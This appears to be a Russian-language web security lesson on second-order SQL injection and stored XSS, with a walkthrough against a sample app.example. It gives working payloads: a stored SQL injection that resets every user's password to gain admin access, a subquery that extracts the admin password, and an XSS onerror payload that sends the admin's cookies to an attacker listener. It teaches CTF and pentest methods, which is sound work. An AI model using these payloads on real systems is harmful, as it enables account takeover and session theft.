## Задача

Обычную инъекцию ты уже находишь: кавычка в параметре → ошибка. Но бывает так, что **все** запросы выглядят безопасно, параметризованы, сканер молчит — а дыра всё равно есть. Это **second-order** (или stored) инъекция: вредоносное значение сохраняется на первом запросе, а срабатывает позже, когда другой код читает его и подставляет в опасное место.

Почему сканеры её пропускают? Потому что они смотрят на **текущий** запрос. А здесь ввод и «взрыв» разнесены во времени и месте. Разберём это на одном живом примере.

## Данные, с которыми работаем

Приложение `app.example` — личный кабинет. Есть регистрация и смена пароля. Изучим код:

```java
// при регистрации — безопасно, параметризовано
stmt = "INSERT INTO users (username, password) VALUES (?, ?)";
// при смене пароля — ОПАСНО, конкатенация
stmt = "UPDATE users SET password='" + newpass + "' WHERE username='" + username + "'";
```

Заметь: на входе (регистрация) всё правильно. Уязвимость спрятана в **смене пароля**, где сохранённый `username` подставляется конкатенацией. Наш план — сохранить при регистрации логин, который сломает второй запрос.

## Шаг 1: сохраняем payload в логине

Регистрируемся с логином, содержащим инъекцию:

```bash
$ curl -s -X POST https://app.example/register \
    --data-urlencode "username=attacker' OR '1'='1' -- " \
    --data-urlencode "password=Passw0rd!"
{"ok":true,"user":"attacker' OR '1'='1' -- "}
```

Запрос на регистрацию параметризован, поэтому payload **прошёл как обычная строка** и сохранился в базе. Ничего не сломалось — пока. Это и есть суть second-order: на этом шаге инъекции «нет».

## Шаг 2: триггерим отложенный sink

Теперь войдём под своим пользователем и сменим пароль. Приложение подставит сохранённый `username` в конкатенированный запрос:

```bash
$ curl -s -X POST https://app.example/change-password \
    --data-urlencode "newpass=hacked123" -b cookies.txt
{"ok":true}
```

Соберём, во что превратился SQL. Логин `attacker' OR '1'='1' -- ` разрывает кавычку и добавляет всегда истинное условие:

```sql
UPDATE users SET password='hacked123' WHERE username='attacker' OR '1'='1' -- '
```

Условие `OR '1'='1'` истинно **для всех строк** — значит, пароль сменился у **всех** пользователей. Проверяем вход под admin:

```bash
$ curl -s -X POST https://app.example/login \
    --data-urlencode "username=admin" --data-urlencode "password=hacked123"
{"ok":true,"role":"administrator"}
```

Мы вошли в админку. Обычный сканер этого не увидел бы: первый запрос чистый, а второй — без пользовательского ввода в URL (логин берётся из сессии).

## Шаг 3: читаем данные тем же приёмом

Second-order годится не только для захвата, но и для чтения. Сохраним логин с подзапросом, который сработает при следующем использовании:

```bash
$ curl -s -X POST https://app.example/register \
    --data-urlencode "username=x' || (SELECT password FROM users WHERE username='admin') || '" \
    --data-urlencode "password=p"
```

Если позже приложение подставит этот логин в запрос вроде `SELECT * FROM users WHERE username='<логин>'`, подзапрос выполнится и вернёт пароль админа.

## Шаг 4: stored XSS — родственный сценарий

Тот же принцип работает для XSS. Сохраняем payload в поле, которое **потом** откроет админ:

```bash
$ curl -s -X POST https://app.example/tickets \
    --data-urlencode 'title=<img src=x onerror="fetch(`https://10.10.14.7/?c=`+document.cookie)">' -b cookies.txt
```

На шаге сохранения браузер ничего не исполняет — payload лежит в тикете. Но когда админ откроет список тикетов, его браузер выполнит код и отправит cookie на наш listener:

```text
GET /?c=session=eyJhZG1pbiI6dHJ1ZX0...
```

Захват сессии администратора. Если cookie защищён `HttpOnly`, атакуют иначе — через действие от имени админа (CSRF-подобный вызов).

## Виды second-order-инъекций

| Тип | Где сохраняется | Где срабатывает |
|-----|-----------------|-----------------|
| Second-order SQLi | логин/имя при регистрации | смена пароля, отчёт, экспорт |
| Stored XSS | профиль, комментарий | страница админа, лог-вьюер |
| Stored command injection | имя хоста, поле | cron/бэкап-скрипт |
| Stored SSTI | имя, шаблон | генерация письма/PDF |
| Stored LDAP | атрибут | фильтр поиска |
| Stored path traversal | имя файла | бэкап/экспорт |

## Полный прогон от начала до конца

1. Читаем код: регистрация параметризована, смена пароля — конкатенация.
2. Регистрируем `attacker' OR '1'='1' -- ` → сохранено как строка.
3. Триггерим `change-password` → срабатывает `UPDATE ... WHERE username='attacker' OR '1'='1' -- '`.
4. Пароль сменился у всех → вход `admin:hacked123` → админка.

## Как искать

- Поля, которые **сохраняются**, а потом **отображаются или используются**: имя, email, логин, «о себе», название компании.
- Действия, которые **читают** сохранённое: смена пароля, экспорт в CSV/PDF, отчёты, лог-вьюеры, генерация писем.
- Разница контекстов: сохранили как текст — сработало как SQL/HTML/команда.
- Обратная связь приложения: после сохранения payload заметь, где он появится снова.

Практический приём: заведи тестовую учётку с «меченым» значением (например, `zzq_marker`), пройди все функции приложения и поищи эту метку в ответах. Где она всплывёт — там и потенциальный поздний sink. Если рядом с меткой виден твой синтаксис (кавычка, тег) без экранирования — это второй контекст, и его нужно проверять отдельно.

Ещё одна подсказка — время. Second-order-инъекции часто срабатывают не сразу: значение попадает в отчёт, который формируется ночью, или в письмо, которое уходит по расписанию. Если приложение показывает «данные обновятся в течение часа», это намёк на фоновую обработку — а значит, ещё один поздний sink.

## Если не сработало

- **Логин экранируется при сохранении.** Тогда ищи другой sink: не смена пароля, а отчёт/экспорт.
- **WAF чистит на выходе.** Пробуй разные контексты: числовой, `ORDER BY`, шаблон.
- **Sink читает значение, но параметризовано.** Значит, вектор закрыт — переключайся на другой.
- **Нужен конкретный триггер.** Иногда действие выполняет админ/планировщик — тогда second-order превращается в stored-XSS-сценарий.
- **Не путай с обычной инъекцией.** Здесь тест: «сохранить → подождать → посмотреть, где используется».

## На что смотреть дальше

- **Ищи разрыв ввода и использования.** Это ядро second-order.
- **Проверяй сохранённые значения.** Регистрируй, комментируй, заполняй профиль — и смотри, где это всплывёт.
- **Разные контексты — разные payload.** SQL, HTML, шаблон, команда, путь.
- **Сканер тут слаб.** Ручное исследование потока данных незаменимо.
- **Stored XSS через админа** — самый частый и опасный вариант.
- **Только чтение/санкционированные действия.** Массовая смена паролей — разрушительно.

## Куда дальше

Следующий урок (`web-orm-injection`) показывает ещё одно место, где инъекция прячется от сканеров — ORM и построители запросов, которые создают ложное чувство безопасности. А пока главное запомни: second-order — это **разрыв между сохранением и использованием**; ищи не «где вводится», а «где сохранённое снова попадает в опасный контекст».

## Где пригодится

- **CTF (Web):** задачи на отложенные инъекции и stored XSS — классика.

- **Пентест:** аудит потока данных и ревью кода — основной метод.
- **Работа (AppSec):** экранирование при **выводе/использовании**, а не только на входе.
